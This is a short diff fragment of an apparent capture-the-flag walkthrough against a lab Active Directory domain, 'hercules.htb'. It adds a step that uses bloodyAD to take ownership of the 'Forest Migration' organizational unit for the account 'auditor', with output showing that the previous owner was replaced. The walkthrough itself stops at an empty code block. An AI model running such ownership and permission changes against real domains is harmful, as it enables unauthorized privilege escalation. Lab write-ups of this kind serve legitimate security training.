@@ -1074,7 +1074,18 @@ instanceType: 4
 
 This is a container for deleted objects
 
-# Taking ownership and grantin
+# Taking ownership and granting full control over `Forest Migration` OU
+
+```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'auditor' 
+[+] Old owner S-1-5-21-1889966460-2597381952-958560702-512 is now replaced by auditor on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+```
+
+This granted ownership
+
+```python
+
+```
 
 
 
